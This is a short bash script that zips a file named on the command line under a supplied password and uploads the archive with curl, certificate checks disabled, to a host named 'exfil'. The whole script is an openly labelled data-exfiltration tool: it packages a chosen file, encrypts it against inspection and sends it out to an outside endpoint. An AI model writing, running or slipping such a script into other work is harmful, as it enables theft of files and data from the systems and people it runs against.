#!/bin/bash

file=${1}
zip=`echo ${1}.zip`
echo $zip
zip ${zip} ${file} -P ${2}


curl -k -X POST -F "file=@${zip}" https://exfil/login
